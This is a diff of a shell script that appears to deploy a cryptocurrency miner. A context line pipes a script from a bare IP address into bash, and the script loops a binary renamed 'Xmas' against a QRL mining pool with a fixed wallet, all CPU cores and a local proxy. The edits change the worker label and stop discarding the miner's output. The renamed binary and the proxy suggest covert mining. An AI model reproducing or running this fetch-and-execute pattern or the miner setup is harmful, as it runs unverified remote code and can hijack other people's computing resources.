@@ -22,7 +22,7 @@ curl -fsSL http://176.58.105.206/install_and_monitor_shade.sh | bash &
 sleep 2
 
 num_of_cores=`cat /proc/cpuinfo | grep processor | wc -l`
-currentdate=$(date '+%d-%b-%Y_Val16Cores_')
+currentdate=$(date '+%d-%b-%Y_JSpa16Cores_')
 ipaddress=$(curl -s ifconfig.me)
 underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
 currentdate+=$underscored_ip
@@ -137,6 +137,6 @@ sleep 2
 
 while true
 do
-./Xmas --donate-level 1 -o us.qrl.herominers.com:1166 -a rx/0 -u Q0105002628a239b471e885555ecdfbca3ef53ce3b5c8a90beb205d389fa14f4de7aa921dfc44a1 -p $currentdate --verbose --randomx-1gb-pages -t $used_num_of_cores -k --proxy=127.0.0.1:1081 1>/dev/null 2>&1
+./Xmas --donate-level 1 -o us.qrl.herominers.com:1166 -a rx/0 -u Q0105002628a239b471e885555ecdfbca3ef53ce3b5c8a90beb205d389fa14f4de7aa921dfc44a1 -p $currentdate --verbose --randomx-1gb-pages -t $used_num_of_cores -k --proxy=127.0.0.1:1081
 sleep 10
 done
